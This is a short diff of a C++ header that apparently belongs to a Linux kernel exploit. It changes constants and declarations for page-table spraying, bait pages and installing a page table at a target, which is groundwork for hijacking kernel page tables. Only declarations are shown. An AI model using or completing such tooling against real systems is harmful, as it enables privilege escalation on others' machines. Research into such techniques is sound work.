@@ -5,21 +5,17 @@
 #include <vector>
 
 #define PAGE_SIZE 0x1000UL
-#define PAGEBLOCK_SIZE 0x200000UL
 #define PCP_PUSH_SIZE 0x2000000UL
 
 // Size of the virtual-address range covered by one x86-64 4 KiB page table
 inline constexpr std::size_t kX86_64PageTableSpan = 1ULL << 21; // 2 MiB
+inline constexpr std::size_t kPageBlockSize = 1ULL << 21; // 2 MiB
 
-#define TARGET_OFFSET 0x10000UL
-
-#define NR_PAGE_TABLES_SPRAY 63000UL
-#define SPRAY_START 0x100000000UL
-
-void* pt_install(const std::vector<void*>& bait_pages, void* pt_target, void* addr, int fd_spray);
+void* pt_install(const std::vector<void*>& bait_pages, void* pt_target, void* addr,
+                 const std::vector<void*>& spray_pages, int fd_spray);
 
 unsigned long exhaust_pages_size_bytes();
-void* get_4mb_block();
+void* get_4mb_block(void* address);
 
 bool is_page_aligned(uintptr_t addr) noexcept;
 std::vector<void*> pages_in_span(void* base, std::size_t order);
